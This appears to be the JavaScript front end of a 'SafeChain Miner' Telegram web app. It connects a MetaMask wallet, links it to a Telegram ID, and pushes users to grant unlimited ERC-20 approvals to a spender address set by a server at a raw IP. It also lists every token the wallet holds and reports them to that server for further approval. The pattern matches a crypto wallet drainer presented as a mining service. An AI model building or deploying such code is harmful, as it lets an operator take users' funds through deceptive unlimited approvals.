/* SafeChain Miner — фронт для GitHub Pages
 * Функції:
 *  - Підключення MetaMask (ethers v6, injected provider)
 *  - SIWE-like підпис прив’язки до Telegram → POST /api/bind
 *  - Отримання /api/config
 *  - Відображення балансів/allowance → approve(MAX) / approve(0)
 *  - Discover токенів з балансом → /api/discover?address=...&persist=1
 *
 * ⚠️ Обов’язково відредагуй API_BASE_URL нижче під свій домен (sslip.io або власний).
 */
const API_BASE_URL = "https://api.103.246.147.200.sslip.io"; // <- ПІДСТАВ СВІЙ
const STATE = {
    provider: null,
    signer: null,
    account: null,
    chainId: null,
    config: null,
    tokensMeta: new Map(), // address -> {symbol, decimals}
};

const ERC20_ABI = [
    { name: "symbol", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "string" }] },
    { name: "decimals", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "uint8" }] },
    { name: "balanceOf", type: "function", stateMutability: "view", inputs: [{ name: "owner", type: "address" }], outputs: [{ type: "uint256" }] },
    { name: "allowance", type: "function", stateMutability: "view", inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }], outputs: [{ type: "uint256" }] },
    { name: "approve", type: "function", stateMutability: "nonpayable", inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }], outputs: [{ type: "bool" }] },
];

const el = (id) => document.getElementById(id);
const qs = (sel) => document.querySelector(sel);

function tgUserIdFromContext() {
    // 1) Telegram WebApp
    try {
        if (window.Telegram && Telegram.WebApp && Telegram.WebApp.initDataUnsafe?.user?.id) {
            return Number(Telegram.WebApp.initDataUnsafe.user.id);
        }
    } catch (_) {}
    // 2) query ?tg_user_id=...
    const u = new URLSearchParams(location.search);
    const v = u.get("tg_user_id");
    if (v) return Number(v);
    return null;
}

function setStatus(msg) {
    el("who").textContent = msg;
}
function setBindState(msg) {
    el("bindState").textContent = msg || "";
}

async function apiGet(path, params = {}) {
    const url = new URL(API_BASE_URL + path);
    Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v));
    const r = await fetch(url.toString(), { credentials: "omit" });
    if (!r.ok) throw new Error(`API ${path} failed: ${r.status}`);
    return r.json();
}
async function apiPost(path, bodyOrParams = {}) {
    // сервер приймає query params (у нас так зроблено для /panic), але тут — JSON body
    const r = await fetch(API_BASE_URL + path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(bodyOrParams),
    });
    if (!r.ok) throw new Error(`API ${path} failed: ${r.status}`);
    return r.json();
}

async function loadConfig() {
    const cfg = await apiGet("/api/config");
    STATE.config = cfg;
    el("cfgSpender").textContent = cfg.spender;
    el("cfgVault").textContent = cfg.vault;
    el("cfgChainId").textContent = String(cfg.chainId);
    el("cfgApi").textContent = API_BASE_URL;

    el("spenderSpan").textContent = cfg.spender;
}

/* ----------- Wallet connect ----------- */
async function connect() {
    if (!window.ethereum) {
        alert("MetaMask не знайдено. Встанови розширення або відкрий у браузері з WalletConnect через інший хостинг.");
        return;
    }
    STATE.provider = new ethers.BrowserProvider(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    STATE.signer = await STATE.provider.getSigner();
    STATE.account = await STATE.signer.getAddress();
    const net = await STATE.provider.getNetwork();
    STATE.chainId = Number(net.chainId);

    el("btnDisconnect").disabled = false;
    el("btnBind").disabled = false;
    el("netInfo").textContent = `chainId=${STATE.chainId}`;
    setStatus(`Підключено: ${STATE.account}`);

    await ensureRightChain();
}

async function disconnect() {
    STATE.provider = null;
    STATE.signer = null;
    STATE.account = null;
    STATE.chainId = null;
    setStatus("Відключено");
    el("btnDisconnect").disabled = true;
    el("btnBind").disabled = true;
    el("netInfo").textContent = "—";
}

async function ensureRightChain() {
    if (!STATE.config) return;
    const need = Number(STATE.config.chainId);
    if (STATE.chainId === need) return;

    // Спроба перемкнути
    try {
        await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ethers.toBeHex(need) }],
        });
    } catch (err) {
        // Якщо мережа не додана
        if (err?.code === 4902) {
            // Підтримуємо тільки mainnet / sepolia з готовими описами
            const CHAINS = {
                1: {
                    chainId: "0x1",
                    chainName: "Ethereum Mainnet",
                    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
                    rpcUrls: ["https://rpc.ankr.com/eth"],
                    blockExplorerUrls: ["https://etherscan.io"],
                },
                11155111: {
                    chainId: "0xaa36a7",
                    chainName: "Sepolia",
                    nativeCurrency: { name: "SepoliaETH", symbol: "ETH", decimals: 18 },
                    rpcUrls: ["https://rpc.sepolia.org"],
                    blockExplorerUrls: ["https://sepolia.etherscan.io"],
                },
            };
            if (CHAINS[need]) {
                await window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [CHAINS[need]],
                });
            } else {
                throw new Error(`Невідомий chainId ${need} — додай вручну у MetaMask`);
            }
        } else {
            throw err;
        }
    }
    // оновити локальний net
    const net = await STATE.provider.getNetwork();
    STATE.chainId = Number(net.chainId);
    el("netInfo").textContent = `chainId=${STATE.chainId}`;
}

/* ----------- Bind (SIWE-like) ----------- */
function buildBindMessage(tgId, address) {
    const now = new Date().toISOString();
    const nonce = Math.random().toString(36).slice(2);
    return `SafeChain Wallet Bind

Bind Telegram ID: ${tgId}
Address: ${address}
ChainId: ${STATE.chainId}
Timestamp: ${now}
Nonce: ${nonce}`;
}

async function signAndBind() {
    const tgId = tgUserIdFromContext();
    if (!tgId) {
        alert("Не знайдено Telegram ID. Відкрий цю сторінку через кнопку WebApp у боті або додай ?tg_user_id=... у URL.");
        return;
    }
    if (!STATE.signer || !STATE.account) {
        alert("Спочатку підключи гаманець.");
        return;
    }
    await ensureRightChain();

    const msg = buildBindMessage(tgId, STATE.account);
    let sig;
    try {
        sig = await STATE.signer.signMessage(msg);
    } catch (e) {
        alert("Підпис відхилено.");
        return;
    }

    const payload = {
        tg_user_id: Number(tgId),
        address: STATE.account,
        message: msg,
        signature: sig,
    };
    const res = await apiPost("/api/bind", payload);
    if (res?.ok) {
        setBindState("✅ Прив’язка збережена на бекенді.");
    } else {
        setBindState("⚠️ Прив’язка не збережена.");
    }
}

/* ----------- Tokens table ----------- */
function fmtAmount(raw, decimals) {
    try {
        const bi = BigInt(raw);
        return Number(bi) / 10 ** Number(decimals);
    } catch (_) {
        return 0;
    }
}

function renderTable(rows) {
    const wrap = el("tokensTable");
    if (!rows?.length) {
        wrap.innerHTML = `<div class="muted">Немає записів. Натисни “Оновити” або “Discover”.</div>`;
        return;
    }
    const html = [
        `<div class="tbl">`,
        `<div class="tr th"><div>Токен</div><div>Баланс</div><div>Allowance → SPENDER</div><div>Дії</div></div>`,
        ...rows.map((r) => {
            const id = r.token;
            const sym = r.symbol || "?";
            const balH = r.balanceHuman?.toFixed(6);
            const allH = r.allowanceHuman?.toFixed(6);
            return `<div class="tr">
        <div><span class="mono">${sym}</span><br><span class="xxs mono">${id}</span></div>
        <div>${balH}</div>
        <div>${allH}</div>
        <div class="actions">
          <button class="btn xs" data-act="approve" data-token="${id}">Approve ∞</button>
          <button class="btn xs danger" data-act="revoke" data-token="${id}">Revoke (0)</button>
        </div>
      </div>`;
        }),
        `</div>`,
    ].join("");
    wrap.innerHTML = html;

    wrap.querySelectorAll("button[data-act]").forEach((btn) => {
        btn.addEventListener("click", async () => {
            const token = btn.getAttribute("data-token");
            const act = btn.getAttribute("data-act");
            btn.disabled = true;
            try {
                if (act === "approve") await doApproveUnlimited(token);
                else await doApproveZero(token);
                await refreshBalances(); // оновити
            } catch (e) {
                alert(`Похибка: ${e.message || e}`);
            } finally {
                btn.disabled = false;
            }
        });
    });
}

async function tokenMeta(addr) {
    addr = ethers.getAddress(addr);
    if (STATE.tokensMeta.has(addr)) return STATE.tokensMeta.get(addr);
    const c = new ethers.Contract(addr, ERC20_ABI, STATE.provider);
    let symbol = "?", decimals = 18;
    try {
        symbol = await c.symbol();
    } catch {}
    try {
        decimals = Number(await c.decimals());
    } catch {}
    const meta = { symbol, decimals };
    STATE.tokensMeta.set(addr, meta);
    return meta;
}

async function refreshBalances() {
    if (!STATE.account || !STATE.provider || !STATE.config) {
        alert("Підключи гаманець і завантаж конфіг.");
        return;
    }
    const owner = STATE.account;
    const spender = STATE.config.spender;
    const rows = [];

    for (const t of STATE.config.tokens) {
        const addr = ethers.getAddress(t);
        const meta = await tokenMeta(addr);
        const c = new ethers.Contract(addr, ERC20_ABI, STATE.provider);
        let bal = 0n,
            allow = 0n;
        try {
            bal = await c.balanceOf(owner);
        } catch {}
        try {
            allow = await c.allowance(owner, spender);
        } catch {}
        rows.push({
            token: addr,
            symbol: meta.symbol,
            decimals: meta.decimals,
            balanceHuman: fmtAmount(bal, meta.decimals),
            allowanceHuman: fmtAmount(allow, meta.decimals),
        });
    }

    renderTable(rows);
}

async function doApproveUnlimited(tokenAddr) {
    await ensureRightChain();
    const spender = STATE.config.spender;
    const c = new ethers.Contract(tokenAddr, ERC20_ABI, STATE.signer);
    const tx = await c.approve(spender, ethers.MaxUint256);
    await tx.wait();
    alert("✅ Approve успішний.");
}

async function doApproveZero(tokenAddr) {
    await ensureRightChain();
    const spender = STATE.config.spender;
    const c = new ethers.Contract(tokenAddr, ERC20_ABI, STATE.signer);
    const tx = await c.approve(spender, 0n);
    await tx.wait();
    alert("✅ Allowance відкликано (0).");
}

/* ----------- Discover ----------- */
async function handleDiscover() {
    if (!STATE.account) {
        alert("Спочатку підключи гаманець.");
        return;
    }
    try {
        const r = await apiGet("/api/discover", { address: STATE.account, persist: 1 });
        alert(`Знайдено токенів: ${r.tokens?.length || 0}. Список злито у tokens.json бекенду.`);
        // Після merge бекенд віддаватиме нові токени в /api/config; перезавантажимо конфіг
        await loadConfig();
        await refreshBalances();
    } catch (e) {
        alert(`Discover помилка: ${e.message || e}`);
    }
}

/* ----------- bootstrap ----------- */
async function boot() {
    try {
        await loadConfig();
    } catch (e) {
        console.error(e);
        alert("API недоступний. Перевір API_BASE_URL та CORS.");
    }

    el("btnConnect").addEventListener("click", connect);
    el("btnDisconnect").addEventListener("click", disconnect);
    el("btnBind").addEventListener("click", signAndBind);
    el("btnRefresh").addEventListener("click", refreshBalances);
    el("btnDiscover").addEventListener("click", handleDiscover);

    const tgId = tgUserIdFromContext();
    if (tgId) {
        setBindState(`Telegram ID у контексті: ${tgId}`);
    } else {
        setBindState("⚠️ Telegram ID не знайдено. Відкрий через WebApp у боті або додай ?tg_user_id=...");
    }
}
document.addEventListener("DOMContentLoaded", boot);
